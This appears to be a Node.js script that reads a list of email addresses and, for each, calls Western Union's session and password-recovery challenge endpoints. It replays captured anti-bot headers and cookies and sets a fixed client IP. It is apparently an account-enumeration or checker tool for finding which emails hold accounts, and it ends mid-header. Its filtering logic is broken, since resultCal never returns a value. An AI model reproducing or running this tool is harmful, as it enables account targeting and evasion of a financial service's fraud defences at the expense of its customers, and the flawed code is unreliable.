
const express = require('express');
path = require('path');
let app = express();
var request = require("request");
var j = request.jar();
var cookies
var client_ip
var session

var fs = require('fs');
var resultArray = [];
fs.readFile('file.txt', function (err, data) {
    if (err) throw err;
    var array = data.toString().split("\n");
    for (i in array) {
        if (resultCal(array[i]))
            resultArray.push(array[i])
    }
    var file = fs.createWriteStream('result.txt');
    file.on('error', function (err) { /* error handling */ });
    resultArray.forEach(function (v) { file.write('\n'); });
    file.end();
});



app.use(function (req, res, next) {
    res.header("Access-Control-Allow-Origin", "*");
    res.header("Access-Control-Allow-Headers", "Origin, X-Requested-With, Content-Type, Accept,Authorization");
    next();
});
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'index.htm'))
})
function resultCal(email) {
    var options = {
        method: 'POST',
        url: 'https://www.westernunion.com/wuconnect/rest/api/v1.0/CreateSession',
        qs: { timestamp: '1530536393692' },
        headers:
        {
            'Postman-Token': '288175f0-963d-4545-94c0-91be14d979be',
            'Cache-Control': 'no-cache',
            'x-nyupe9cs-a': 'jeEOYAa3gBS8adyHaAtSebVSayHEDKumB3QpaWNHzAt3xAN1M1oHqXD3z_hP3V-IGWtvzbfStpQvrpQHtY3hgiQE=9SXo1QUqm5ErUD1rltdeWuwqSkFeWNUqXwh64oSdXSmBXjXqIR3wW5m3OSXcSkFrInzrrQpbye5t9jUqiQArtQpjYcG=KRGnXBZeYwWqIQQjxOcGAJMjixReWBC59zRB5kSrebDxXo-6XwKrYNPaWBhjYNzTYSPgWEwrXbZqmQ8jybiqUF5tYHpe_hpeuS5q9ABqhRhB_U1x=u0z1tO6Xkvq9kOj52hjgqMeyeSrXuBM9tH6sV5aA_wr9eSJY5SpNDhx=SVaWBZLyeBpABhe1QHoium3iQSabMYaAt1cXkEeAoEr95u=mbn3AuOaW5vYWZvq=u86IQEq1D1=fW8jQHzt=urq9t3jYNL1iNFq0Rpe=sUzS-PqlQ1qmZSeyhmQltGqlP9=1eFjqnytmWlrgjSz9k-qYi1j-URD9N33Lo1rY=1ciu1eiz3jgzprpizTbtpt1y-fAoG6XAnGiuvNx1eR=_1TjSSD4oweWtvrKRE6SM1=mNFabN1eWtm=KtFLANpz9UR0IQER-Sw0=tpRyQOBmVUeJoO65kmr9uSf=xhxlb1--Sm6HhR3SoANgovT=UKtBSHR-lrjY=4RWAQedRhqWjveWNP0-Q3zTaZGJa8=9jmqRQ3zhoG6XkLJYNFeyrhu=NYebZIJNu5-9nHtY5Fdy5mcXKaN1Rvr-QSTqEFazahtxGmj=tV-EF9p6SweJF-uXwZaygIzLFheW51e-RmtmhJZX=HrLBpzdSpuPhRmKSODAt-T1LYqBomqPnP0WbpqbbZqyQpgRQstmeV0WEPuxRhgyPha5Dpq9UhBmEmqSB8eLbYz=u=qA_wuK0h3-RZcX=4ZmeSTAN9qDOirpRZ0=IIazo8q5DRRyOHgAQH=2odfdQp0=amNWwh0ARafAL3zSk1rlqiz9xhGIQ=adyVO9nFGXkARWN8jXuOdIkSz=XIB1uLr9EvZKopq1BGj=H0cUah=EFwcit8xUgI=m3Ze=QNj6KhjX5FdUev6meHj-R3r9ZSJLrhDAROayRhjBNUc4c33NDOEKQGfAtzLW5FuXab0-QBe=QSqDbrXtQyaWkpab31Yya9uEFH6loF=9SLuAoztwQOqYZPabZ1LdH0q9osqbN-aWB1=K-hjiQBebNNBHP8qetlNW5GG8bgRXumw9N0B9=wqRR3jBkvLuobYyrOjIQPLX5S6JumTYkwjtN=UEoSzY=ar92IqmZ9x-QP=9ENrLHSZXSmu-k9Rdn5=9wgy1zvj9ELLyuEeAxhbbBi9=NHcKxhqUQ-gFhmt=ozeWumxKNpazr8zIQS3luFaW39jNeIZDHm6iaVzit8uWN1o1oWuIHm69evrxy3eJoHeEkSrvUfj=L1jLSp6ioIeLuNqX5v6VtprYldf5fI0AQOT=N1jxQv60tSJWnXjKu3t=zZ0=U1Z=uvz-QF6AQpGWEHsW1dNYNpxfuljRuXRX5HjdQ8YY=JKHBGD9n=eWx8gxOmxi=ADdR3R5N3rxR1eAxRz9Hd=9Np=Ku8T2ajzSFwpIHKT=tpDKoiN1ylaza1GPaZjLQxeYSHNmcwr95=qh53pZQVT-l4qYt4ayj1LdkPTY5p=9NFcholN2QFtNZ=D9e8LY5m2WOPMX5lSRlHe5uHzT0IqpwmqmPhjWMWuYnV=KxhzJowdUZ1xUE1RAtFuIhCeRQ8TWt=9itpzXSL=9uSqIQrwx5pDmB3r9bGNbepr95prXkILBelfAi36XnSzD5bqbKw6DEwT5cnrYWIT-QXT=tw=KoEEiahuvRR-6aprYomjIn9u6cnzWNSB3RhdAax=9=LadQpr9n8J6=QqYH=NWHKfdQyqpQzINeSLE6Drtt-TYr1N9EFLlr1aAoFzboBa5k_qKQ-jSawr8z3r1zhtk5pASkU3iupL1umrTQve=oSLy6RR_uXa5kl8l5STBtFDyjlaDep3lb3wpQvaAHceXSmZInFaAamT1xhJWMQxWSSLWUhzWBMeAodqKtSfWP8r9tXjAaEzPy3h5fRj2QHjAHvGJcqw6GGTWZFzAovjW-INAovqUeGrXNEzW5c6IQH6it3nyOXr-RpRWZFchQmt-dRRzjnqW5Eqfb332cdB9kmB1ey=mt3DEem3XLgz_U1jYSLq8QLq91JrYB92Y5me-w1zWoOqmzh-5cba5eS=9kpqAL3cXZSTyjzeWNVf_Dnz9MUaANSdXN3eW58rxQOpWbyLAoyzWBhj-eBeASSqWB0zzJj64o8q9nPfWBRqUeS3X5leNLA6XZv=KoStNo8q9NzeWelqYtm6iuX6Xxrxf5BRiuBzdR9FY6feAtnab31q6opjmzhTUuvrBoijyb3N1uArUuFLuulu-QEr1BRpbNvR6os69MdTWkBqbNltYt_cXN=a0uFq=t1zBBh-K_crXMRzDN3j=jUqBNRrEDhj=tIjNyMJzozebYjqxQPq1510eH8aWtmGX2I0A=4JbZOrFD1ayQSD5DheWDa=3OOL5kVTBtlaWu5B95Iab1XJKoHjBN96IUO6ioUjYkSjNkOc9SmRWNp69N1jSkpaWHsqXDZ6XkmabNmBUD3gWkvpmnAq5Md6mgeedyP-ENutdnmtT5Fq9NF=9hraRQEjYu1eQQv3WNvpNtP6ANUTL5pqdRmxihPaAahTYnBayyYzwQHLR5rcmeoNW58G5tXe9bh9ABZTTo_qpUGrhQ=6iH3eWplq9n8Nbn33Xt=q5VHjNPR3XNH=muSp9lJf-QV6bemaWBhx4oSr92WtNeAAWZ5AZGZaWNXqEkpaWuAaWYS=9nURR5SmoGKjBtarNkUedSSfWzRqUZvrSeHL9S56Ex1j-Q5LRRhjLhhgWkmD9gUAYeAxvSpT=o2qKoFcAadLKcwqR',
            'x-nyupe9cs-b': '54b9pq',
            'x-nyupe9cs-c': 'AEARsFxkAQAArCdzdVPOQBt_zag0L-Mxt_TEb8K6BsiW23BA20Rau2ei9oBl',
            'x-nyupe9cs-d': 0,
            'x-nyupe9cs-uniquestatekey': 'AEqfxlxkAQAA_T9Yrvqf6Ck_ESAb3KrLdGnIe2OUv34engcmdKDzPNqzXLHX',
            'user-agent': 'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36',
            referer: 'https://www.westernunion.com/ES/EN/password-recovery.html',
            origin: 'https://www.westernunion.com',
            cookie: 'PathContent=/content/wucom/base/es/en; BIGipServerwudispatcher.westernunion.com=855715082.36895.0000; resolution_height=800; resolution_width=1280; is_tablet=false; is_mobile=false; AKCountry=GB; AKZip=; AKRegioncode=EN; AKCity=LONDON; AKAreacode=; AKCounty=; WUCountryCookie_=ES; WULanguageCookie_=EN; AK_TLS_Version=tls1.2; SERVER_COOKIE=R4; mbox=session#511d349636594215a6313e9b4008f8eb#1530538239; AMCVS_AACD3BC75245B4940A490D4D%40AdobeOrg=1; AMCV_AACD3BC75245B4940A490D4D%40AdobeOrg=1099438348%7CMCIDTS%7C17715%7CMCMID%7C05521918946796555033626033985544718340%7CMCAAMLH-1531141185%7C6%7CMCAAMB-1531141185%7CRKhpRz8krg2tLO6pguXWp5olkAcUniQYPHaMWWgdJ3xzPWQmdj0y%7CMCOPTOUT-1530543585s%7CNONE%7CvVersion%7C2.1.0; _abck=f485yh8ugka3wbree44h_1760',
            'content-length': '1438',
            'accept-language': 'en-US,en;q=0.9',
            'accept-encoding': 'gzip, deflate, br',
            accept: 'application/json',
            'Content-Type': 'application/json'
        },
        body:
        {
            bashPath: '/ES/EN/',
            channel: { name: 'Western Union', type: 'WEB', version: '9Z00' },
            device: { id: '', type: 'WEB' },
            external_reference_no: '1',
            locale: { country_code: 'ES', language_code: 'en' },
            security:
            {
                black_box_data:
                {
                    data: '0400JapG4txqVP4Nf94lis1ztnqv7CRnBjGOXyx2B+S3GHv4zk88XIRRreSheVy5uVhms1zdzcTh8G1jzSkZrXqxWzKE0A/nZNqkwx/N92fWAavNc/p/1y9PHkhCTHg+Ms0Qhlz5wlRFwWJi0FRulruXQQGCQaJkXU7G/xCx87H3fYKpqOurJ+l94mG/cdkIMFbm6Yf0/pTJUUx4zcJIblb5JwydKgnOIDKXq4HnEqNOos2/G9pg/BLzT0xFXRiZcQcAnPGnG3CqgLln+4KLswTyWhDAstLN4US5V97h50/5jKuksZ+gFcc8aSdlq6Ngoi5gQITTv1Udki2WMCVbBcdxP6GA3q0kDinWcD6T1dGUjL/hT4nUgBHv4srRWAJJyLNLGj8lONaIGWAEO5SUXZsfzDNnJ9MtC3SwZ/Ah9jXzHp3ED3HepEpuM5tlG61Ntm9z3eln9a65pRCSbhnEUAORTqNiYutQpOa3V62N6Jqrox+LqCpize7FnCuSoEQI23c8MGfGDfMJjL1T/pZNnUTdpA1nyvZTTnwuL6uF5RaYfJDHvJpxYj49Ituh4sP0IV/AjqwHORviq2ncsJVGc8WrWaLE8yqMVQun0jxRYAmjKb1P4ehBV15lxB8HyigIvqgOtuhMAAc2rn1HDo0vYYDC32yzkoyzQ+ygbazR87feXj71svFCT6Ov7S0VWBiBsphp15tFwbb5NkVtrNHzt95ePpTGzJJvTFl9FmQWppRl6Bv4pp48B2PR0LUM6Rn3JtHEfF9hXdZ4DRRiwxmZVjl9I9/GSHlRbmqB3FC5PmOztORMyPpjzYuuV+VhT2JQxvTdC24eZzo97tw16kQoiglK7BJDLfM/X8TvaSyxlUFCiGEdsE8OdwolivehTqT3rw1rUL/Q9DBUr0B8X2Fd1ngNFGSttdZygKPcjXOee1yaDxciKug0+fq4xP2vFnup4QVZmvVWVqAwSicuR/GvVGCWVsTCBZ4TPdh6fSO+PRDZJ3t6I7HSG5+fdiq9o8M92MmVzpOtSOhYmUcg4U0csxkunCw+Jld00Kp8x9RU1HbupPmv0U+PWz4GSIrr+l3H+CrCQOoYdjeTIN4Q7WiTJdXVW619Jo9sezyB2DaomfLTglnhwCemZJhfAhzQxNaIYqv5',
                    length: 1156
                },
                client_ip: '245024209201'
            }
        },
        json: true
    };

    request(options, function (error, response, body) {
        console.log("creating session...")
        if (error) throw new Error(error);
        console.log(body);
        session = body.security.session.id;
        client_ip = body.security.clientIp;


        options = {
            method: 'POST',
            url: 'https://www.westernunion.com/wuconnect/rest/api/v1.0/SessionKeepAlive',
            qs: { timestamp: '1530552379733' },
            headers:
            {
                'Postman-Token': '6c6c82e2-f8b0-4835-89bc-8b47ef90aa0f',
                pragma: 'no-cache',
                'Cache-Control': 'no-cache',
                'x-nyupe9cs-uniquestatekey': 'AFhq2ltkAQAAoaBqprVRLxeZP3fKVbefL6QDKK-eTWSLLPzst-pLYODN5w0Z',
                'x-nyupe9cs-d': '0',
                'x-nyupe9cs-c': 'AEBX1FtkAQAANVKsr9XWqwhAGGbiv939SwbIO0iwSp5fwGkPqt07bEXF7876',
                'x-nyupe9cs-b': '-d1ahnu',
                'x-nyupe9cs-a': 'n6rbmBdKXjYCXHcNYZzi_oLpu3-FtC_D4hVhmA_DSs9nU3L=fopmsRY4sKG5rGHNX_rGQwVwkRVsFTQGX-rZuTtwvGJmHcxmdwpDqTdRHBd1CkqKw3WrUwYddgpaFZaW4Ar0tO=1CsGLS2Jl7lLDuLO57CSId0FWuApErBMUUWz_FauWsCdVtodgVi7g5JVMYTOvFTdC=PdIqZdTX--=6jLi=Pq6u2ohxZziJC_hJ_vkgTp54LYUSWYlevSEU6CDS3TWtCKpCIzgvPdm=2VDMXd5M-QKqAaWs3dLuACU4w2c4fzv43S1c-3Dq5Yix-p1SCQLnDLM4AaBFPzpUBGZnCtRc-=WnCJ5b_YpUTpl4TxGaB3UXazp4BMD0p_zvHdZuAdMtquTUsVUPkFWTG8GnRVprizNP-WiuTt04GF1r_OKxAnwqG=qxZz0J-8M7aIDt=1DuA-hdjYpxT-PqOv-Xa8LsfFggWYVMar=Q=O5MlqW7HzKbTGLcZJCUDto5wVUV3nL7AQNqA2st-QLuDGpSA7YVaoIuwrm5CK6UQqWFTdp4ZwG4=Lh7DYIFFvPkZdEU=U5xwYhQcWrYGjhkZJotpzB5-aKx-0qUBGmxHqWgh0NRSYziWb5LwQCFPCWtG8K43zq3A6DtCdmt-MK7aiWEDFvqsnhQaC7GJQ4U6d6d-r1xLbhxToUsG85kZJqqsrhS3vj7uFrxrvv7DY1s3JV74dnu5VUFZ3wrANM72dG_ZJDtAOWX2x5rB0muZV_u6NW7-ZpCOGL4url_XzmTxKEFwWa4TLlwNL0z-FYQkJ04sMDdPF0FZFOnKzMFhUslVQKJPoMu=Gl-ZEhYTS7V_xEUjYl7-GEvj=ex-CpFZzpk2Xh45xU4-qPnEWDM7tErHO3_TQl4Arlt_oUbVQiFwYlqT9Iu3JmuAoa0pJCCjLsabYMXTrikqaruAarUAQ0uBrDS2p0qAdNSGvWq2H9MCnfu6dEe-dMufFsWOdDYV8pnm5ht-WvYwYs7_F0OWFsU5vvr2NrWwYskZqmcV4AS6dLumxNqO5v4AQmgWFrFVGkxCJiU5YluDAhC08sxZROJmaPS3dh=jqKS=Li1Xzl_q2DYYrLvZvrHB61UTGiJB=JniPh4HPqC5mkrAro9wLgHw9Yu0xmIELZ7_vmQqGstBpc4A80upQwxZQmgpSWtzppJr_p7CRvQIYC7l3v4Aqh_AdYxSTMtZpGqqzNxG=BR_lzPA8lS0=1kG=vxTPGUA8pnar6wDSixTa0XwYpq2z5FTOrqv_D4aR8qmG7ujx0fi7WGRMQnXpLJVGp1Zd14ZaStTnWFw9fdTNvQ0jctTGq7Nzl7BQRapjDnQdpnSDh4DdIq6r1u2Ss-T0pq3qU4Zzlc-aigZW5C8dlv3L0voWgJaxbOTrsgBdltBQv_A75SWMwUNzpvYvKX_YAU6Y1SCJ6aB8U_OVUBELpth0G4BCLxHZWJSMmt-ppxoLVsidDUhLE_z=iBTIWYOYQuBGESB8wHmaXqvJvuiFWxZgWuioCu5d1U2JmdizqxPQl4JGIHZzAXCQluinSdaQI=BLhkV3wtwwtxGNWvw0mFZQKa5lDvkJKrACY5F6WuoWWko3YqZrE=sz5QRpBqVqswpYGM-ziSHzatQVpnNts_zJL7AQ_FwvBq=sWtR2sDGJKniOB4BDsXTZhQ2VptCScspWW=DS1SBdhHCz0CsJacPQiJlWWPp=ZnRYmWTGEug3s4SYinQ=B4BpwtlLidBFWuApEC5YwFVxiq5VMV6dUFZSrUA=W4uKstGxiMC4pJ-=PaIGwPT3Y7lWsu5YFnHqWq2QUxTagq-QpomuMQ5YZlOriuWvMC2zhQZQpqAmwFTQnujDhQdSUFGWFJkaiJ-MI7uYvZW1VU6xqdvsiUEh1t-SrkZdDS2-h4AGnXsSjUAQ54mxUUmdlYOr0xlDhvOQpU5pEJGd47Cq7uPvWVA8hUmd9xZJDC2YCFzIDA-SWsGJ5qQd1a8pln3_UBACUt_doqBDUtaRXFoWU7Q-h9QusU2JluDGLaVqOkOCIJ2J=7BUKFTpUMau5q5LmqSOsU5vV7HdV=OBpCIs1U=nW42FW0DSgvZzm43FWgZzMJsgs4AjDU-MPV2J1U3FWdczD7-8N_5M_t-8lvOd5UB80UmohQZnSq0dhnjLpQwYmUSJ5p8_gS2C34j7OwVdLUBTXR=MmXZdGvZ3LC0Lwxv9h8oDwXVplCV7BU5vsUsvvus9UQT65xXYZ_oDhHAaWYVQhCCzpN0z5xTmWFcF2gArlX8M1FZCUPTG5tu79z0xpXRxpxGaruAM1FINJ4pd58ms5dZY64sYZSarRdizZxuKpGrGVq-s2MtpmTwvWXCJDuBqv4Bm54B8DtOqvuWGvOcF9tOl6tDOWt0YgAIdan-xlaB85FwhGxT01UjDNCBQ5kYgk5DY6SB0GsmYLM-pLuZYZn_VDqTDUtTQLFOQ3BTCptHck45VpxcvWxO6WCIEf4PJUkVYDxV6w7AJvvPowuTtmSGQ14Ixw71JIJTOEB-8LLTJl42QVt_SIU2zmSGdmFGznCB1lqPqWYTCD7idNXT=OqPzBX=1LusSj6Aj-P_dlUpMUnTt64koLx-uDC0a44mxmtAMiuEAhX_GGMHdpUDohxwYQgDHht-qW7-QitXmORqpA7Q8FuEhe7Rv9t-roXPQsJ-ox43uHtaofqLmmuBDjtQ=IsAmWx60lUBQ5U6rqxOVhJBCh=IdvhsgJq2JOtkQptEjU4mJEqTQNFTQ1qBQpFOVU4B8mHsJpuG8m=vMarmqutSYRX-Q5FT8EHXzl4sYEuZdCtHzA7HzbHaQNuZdDqTr6dhmiMR0p_T-4cT-hUiCwkOMmU2dCn5LlxZtR4TWs7-QlusYDHoq14PqruNWBn-tmcTt87aO3FTkXFT0EFOIUghvstpnwxoLit2JmaCL342zi7D4wUrZBd_-J2aQ1Yv1LSI3BHZdL42aTQBCGq08EqTrAqTGmakQ8gBQL43QpuAMEC=xV4_z=4h0_A2_RnTQmUZJwqH1U=h6vVPOWqBr1CB6WSZ_LtNch75YpC08npC_J_VJaJJLpXoMpO-QlS6aKtRvWC2SsgaxlSBSmUiainmQLaOdfkdMES=3IX_VZJ-t5FZ_hu3sw7BsAqwYiq-G1kVYYnmQm_a=r_A=OQjDwufncYYxmvCFrMuKEFVQmt-MZUmzsaGKDqOdZu086tAsVFZdpc-GAzO8p0FjFtSY1u2xLAXFV_oL9lGuqSBG5tarEnWYpM-=Ov2QpUIx5GsJI-TlvqTs2HTaW7CJsnADDDaqEvOarJ-dqXCFPuTIhxTavH6UJJ-QEt-Jic-ZIXCzNnDqiVidzABQpniQRuPzEaB6Kz3dZgAOPt-RNt-jYdkQm4OPW7SJLJaK582FU46zpCmlIufvn7DOWtR06vZRhrhPhS5YwEjYE=0JEq0xw4AM64izmFwrsMHrTUBM3CBzikPaWF6LNCBQ6XAChQTCLJP4UgOvIPPd0M-tNshvrQBpDC2JlVAja7_z5g6LKtXoDSCp_uTOPwZJ1MHzwkZtidT8AxOG5kToUYqgWxZ4guiqW7SWPFP11qMoM_vS9uwv1tBd9tvUBtQJpsEDFtmzww-MmSQx5XBGmxSVWBlWs73SW7_7IdAs24puWM_YiMJMEu2zoPZz54a0ES3dEQCJmUkQ-Eizq410lQjLNfCYpa2nsNTCL4Or5tT4DCB837BLIRBGP_6Si7-srV6dCUDtsUAto2QJ6xTJmtJ=',
                'user-agen': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36',
                referer: 'https://www.westernunion.com/ES/EN/password-recovery.html',
                origin: 'https://www.westernunion.com',
                cookie: 'PathContent=/content/wucom/base/es/en; BIGipServerwudispatcher.westernunion.com=855715082.36895.0000; resolution_height=800; resolution_width=1280; is_tablet=false; is_mobile=false; AKCountry=PL; AKZip=; AKRegioncode=; AKCity=WARSAW; AKAreacode=; AKCounty=; WUCountryCookie_=ES; WULanguageCookie_=EN; AK_TLS_Version=tls1.2; SERVER_COOKIE=R4; mbox=session#641df218e560455a8beedd67dbac3d00#1530551269; _abck=dkoc4gexrhhbaq5h5cit_1953; s_dfa=westernunionnewglobal; user_txn_state=0:1530549414159; JSESSIONID=if91j1a6vvep1fn98fz7imlio; AMCVS_AACD3BC75245B4940A490D4D%40AdobeOrg=1; AMCV_AACD3BC75245B4940A490D4D%40AdobeOrg=1099438348%7CMCIDTS%7C17715%7CMCMID%7C66763440628435560523005198298108464384%7CMCAID%7CNONE%7CMCOPTOUT-1530556617s%7CNONE%7CvVersion%7C2.1.0; s_NewRepeateVar=1530549417155-New; s_NewRepeatprop=1530549417156-New; channel_stack=password-recovery; s_cc=true; kampyle_userid=1557-b9f5-101c-8d61-9806-f6e0-8488-6b28; kampyleUserSession=1530549420594; kampyleUserSessionsCount=1; kampyleSessionPageCounter=1; kampyleUserPercentile=35.10493657397837; cd_user_id=1645bdac6625cc-0430d9ccd7b319-47e1039-1fa400-1645bdac6639d0; CookieOptIn=CKTXNL+CKPERF+CKMKTG',
                // 'content-length': '95',
                'accept-language': 'en-US,en;q=0.9',
                'accept-encoding': 'gzip, deflate, br',
                accept: 'application/json',
                'Content-Type': 'application/json'
            },
            body:
            {
                security: { session: { id: session } },
                bashPath: '/ES/EN/'
            },
            json: true,
            jar: j
        };

        request(options, function (error, response, body) {
            if (error) throw new Error(error);
            console.log('keeping session...')
            cookies = j.getCookies('https://www.westernunion.com/wuconnect/rest/api/v1.0/SessionKeepAlive');

            var options = {
                method: 'POST',
                url: 'https://www.westernunion.com/wuconnect/rest/api/v1.0/GetUserChallenges',
                qs: { timestamp: '1530540724504' },
                headers:
                {
                    pragma: 'no-cache',
                    'Cache-Control': 'no-cache',
                    'x-nyupe9cs-a': 'n_VtgrY56m=6=TQeX73ZvG5_nsrGeTYyr1gdnB8DDcij9cx7EGlKnHbiP0ODk7pj9QnPmCpxAsrKTQpBvl588cVPvP-6mHIwbMlKmw9FN738O5-0RgrBf_-8G4ptWcreguIG0xCuyPRKmje_XTIWfSR_ejyq9jldWi1tTi14iX5dI_6Fms9WyuqX=H--FilpvlB_Fc_B=jWtvgihmfi-kIVjFdC_=DWxfjeDDsEe=eytrwiFnxb_3G-_8ZldEUpOnjWrDsJvEMldkNSl=r97R-=tOB8KnCKhcj3yFEYk9IkhvgC-=36tbDfD8srFFtGtJUcdbqQGWA-7Fgp7mx1lrHUoIEouGZyjDsZKVZ=73opp9fyTRw=vf4ppXTYyTr5-FvkPbEWyxdlL81kwmZfGfyDPm_l_fuPF8teemlIQNvlKXMV4XBitVelK3IY8FUV7FHBBfHx-msihDMBg8r5KDsye=ePgnP3ho-9ANc-jnjWxk7KkmZWkFDej80YsXsC_XTWMFlSj9QYwFn8K3l94IPpEXQ2HFGWHy3p-eeWSFcwWFl-6mHI6fjQhFui4nB9FnGkBFUKP30ijmwY_9r93DGWGngYBFuUjrtx-IepsWG=4QgQwFMBBv73j3vkFIi4_mDY-nZKxRrr_b_3_Q5IwYtpenZR-D5K8Q5=xFtWZnLlFNflBIM3oec08xEeKFgrKITV-mwp7FUDKet1kRsQoFg-JlQDjXv-2F3eoXNY23PYBVbIxbEW_03WtbgI-fcp2X-1roEGrm_RKFjkpn5rpmHI-=73tvwItG=Rpvco7RsQGewDtEGW7kK94FgipcUlZnumF0EI2fBP_=3PFFgrd=ul4FHcXlBV780p4Xcbl0MV-n2itFHiwetW_Xr6-8vFOk7KeFg_jOsM_=PRpbHZlrEIh=ubKmLVjEPrKqxMeGl=_e0Wpe0VWXfz6ygI3msbDiHr_my=-R0ldnSpGndlFveYRtH-4WgrWFg-6qg-4n5y_0uWuNNotgSBK8zo_XCV8frQomsk7LgblDRo777pwqMpFoD9w8dFoR43_FSp6Ptld=VmsQHk_NAXQbZ0_4HIwcfGzIsU_nu3KrCMk8vpp3PQKvH1yXvJFFlR=lHTcXnPFEP0KxUyDFuWtFGb6Ie9krHC_nxbW8B5F=PrF9x1Y=cQW3Hr-9fWdXEo_TgQh0giiyUB-WDYMEPQoR43K2GW4Rjl_X7KDS36-FjWIQjMWmwddeD34tlyKrFVHmI1DFuP_mDWP9crFFHrU041emUIByMMD=l96F4Vp3uM-9nYD9nlKQtWSvPI68CKkIQbKN9I73uWwQElKEGkRm_dXljVw8cVwW_mKXrqXknYIbE3lDKYkwDWPRI1pVPRqXfPKyYXtnHnKejW6M5qd0jeWNrfGyEIjFM3KXgIj=3rK3uY-3e0-WuyWvMlgbEr_3Zfle2ldeSTdygow=gS2fQV-XP0_FlVGeryG=MBKWPfoFHfeWcptEefhWGJGX03qXTeK8xC6bblDk0-dFwy28s8K0j9weU0-eHkUnjIjXN6757WO8wVw3SytFtkd0DMF0cIxCjYjRsM3GEYMXcSDrDyhyibU4chtt9x8fD8K9UYpO45F37Bs3ZGE3GeeV3bDmC3D1Z0KEPQKLHp-kTVtmhXyF5Rp=71-bZGpmEW4fuG7f43lrEWWjEMGcHcdXTlFf-M90jWrVdZ_9cFhIgV_vU968rVsmdW-FsMpvuW7n5V-FlmKX03_XTQDbCMPFPRKeHIx=g3KbZ0BPSIQQHQeKTPK8LzfF-merE97V7VQT7BeXLBKXU1tLTW-vlXtoEI-JLYPXn=DylMRXu0=fcizvgVWIe9VwcIhXjWj0gQlIgRBbEQltuYZOsMGPg0B8ckMFwM_9H-4rHds=GerX4p-DinjNfqeVjQRfyIe=P-derflyg9_gHroEqV7=Gl-kjlFEWl_=KitFgIieEWjnPXw5Ky_DSQfXcYpQ-Y_RsIcefViF4pw=Up2nCp4egIF8rMGbEGYyiC8NckdWlJPTcItFIud8b5KXPRBoEW-3SIfmNPFrw2De5WjFGJKH50K9PVp15QW=UxwO3KepeWwnBYGRDRFTvk_qMpxfcrKmTiDrtxwXGKVee1Sm3lkD2AdO5p3nsIjbZWhREeWFiM_0ZfUL03GuMV3EZRGmwY7q5Wt=lOjDgFT33MBtScKvPV_mSi-XjiI0P9WYwp5b_l_FKipygwMvbeK=etdJZpjQb3oIT3hIeM_oPv__SpGfsV6VH9jpSoj9cYG8Cl_mUEdFHBk8HJ_9gkl=Qo_8veh0Py6Dgi3EGwjn5-OIxRFFPM-ug0F3_X-bEWSbwCFeZ94X4ejec3V84Vjmjyy87p5WVyUmgktVP9ZFU7VnU0K8cnWF1o6fjlFXueKqfWBFvejvgX4krVwFeRGbxCPEUR_NHbx9cPBeey=yeipqTxw0EetFEeDRKUoFd5U3uX3FuQLXSpGEPSKojijRSUUVSX58QQKF5RYOL_pmHrd=gDGmH1-9Ipl=Ty4eI3lXgbKbx12Z-Yx8vWG=PVOTsVFerY3RskW0e-BHPnoIrGppf97FUyKKiCdn-7iewCe3I1kXP3heGWjIHZFVulKLMVtk7p-kDVy0_VwFurBewY_=chvRHiwX-neFsQjbHQGF4V-OBRBtb-xFrWDFSk-EgUj=MVwFMuFXrVjtg6jvuVP3PYyq9ZdHKWtn-IPkvktVvS_bxVDeRDo0eeg=M5B==VOX5MKIPV4=qmF0lXxvPWtEuY6tUIpDnRpR5SKXC1p8blB=PlpfrQgfdFHJHrFG4V7m_I78cUKIuMkRHptGjeondlewH1-Fgwe8sZpF3P-mTeDTB0FFHQeve9_vHFGmQPKqw=B8cHK9mn4TMM_F04XyUohquXU=iYjFKQeeE1ynbipvuWQAu8DXuIPXSW3oc_-N7M-WtxO3gMSnTUKXc8eTGkF3KW-ITetnCBF8Hi2O5I2OcbheSnUD2YxfKfeIwhdygPK=UribZMkkcY6Xr3lX0lD3M3xUinDnsQjf7W-FU7BnCp00cQK9rROijeDfKYDylC-XfYfbx17FMBFbkBKkflFuURieC3AvGW69ElFylm-tgr_M5eDUe3jEHV6bPW-VT3tReiMEGkUmlY-mA9AFUDKXQyxnMB_Ful_bHRKyeleli1jN73hyGxP3uWHXfVWVwiwVli2rHp_X0eKbtktmKV-bZmK9wYwml8oNvk1mCMKyUpHFMG5FMBen-noQs-PX57Kn53WFGrdeUl_mCeGmjyeXn86mciitsXpv7BK3go7nlVrfweWDHIdyuMGmjlFjxYwxgoR8Spins_eFfi4DdlBbtwKxsm_=eYwW2m_-c8KEgJde0leEGWytHmgvTWif_W-RvJ_EGx63tx_LTQWnZ9pEgrp=Wl-krMpQCp20PyjmCpsnAV_FlKiEGl-UuelX0e6rEItvqYDFTV4XDi_bgKlbwnkfB3KmrV-SHiuEvKKI7KjmHIrTU2g8nUjDu6wksKH9chGAdWDm7MefSMUDleDWUWDHci20PyUXIreEi=3nZrKqlMKRK3WRdxdefVhnjI73HrBkcSDIP3KygV_8_X-=G5VnoBKXSMDEP=jJx1SyelFNvW4XgIhRBh2FHIjFuWB8r9wejrr3r0K=PRBuPfK8g1wFtlKsjUWyPoOTUCKigx7ewBGbtFKDWPz9fpwXt5_eu3hPgi7m_iw0PYMeMB-0cmKKlWw30=MDdW4mCBpXHiw=P9rWGWieg1eIw-pmQYGFUnh=i1xFsiVfOZQVCKtKuitFtldbbW0Fui3Nf1xWPRpXggWQJk2mePDXgke6TWw8cFDm4-p8TIy=IrKyUYDrxVxFulF3_eK9r0FVGxBQsI40JzGXqYyXnnZFgIMEPlsn4W7NG-hbF1S=e=4=lo6bZfeeqy6Nv-Sn50_eTW-tM1iv3rFN0I6DbKs8cCDesrDCeUqPckrylUomI1wHgY6bt-wXMp7EUD_EuQqEi1yXNRKqbRBDgM-=URknUpwn5yKye9tXMM_rDYSIEWzFGkpFgktn43Wb_Xwevxubt14vDbWFBewmsfw9CW-yUBYEg-turflXc9GEgi2O4BFfEuKbBW-8cp-FwZpWpWk3Q=-EUpvmGeGnEW43U3hffV7kjW-njz6ml2UVC3KFrI4VrYMeePUTTlGNrIx8AR-bgi-XTluYD3P=gyDKGeDWsPee1xSewoTEUrFF4V69CVrH_KwkTyOm_YDXEl-yu3_8SlKTP3G8QDZ3h-2FPM_9Di_RgJF8ck-=Hbw1Z0KfUKuQjXtTeYQNTzFTnUKRrp2mSppmznxewpWefYBFTyh=uGd8IRy8L4FyWxpNZyqm3NdGio4mw1PbD=DFgbGmHxe3EWpqUpHng5KvP5eFGFO_dWyXvotV3W2F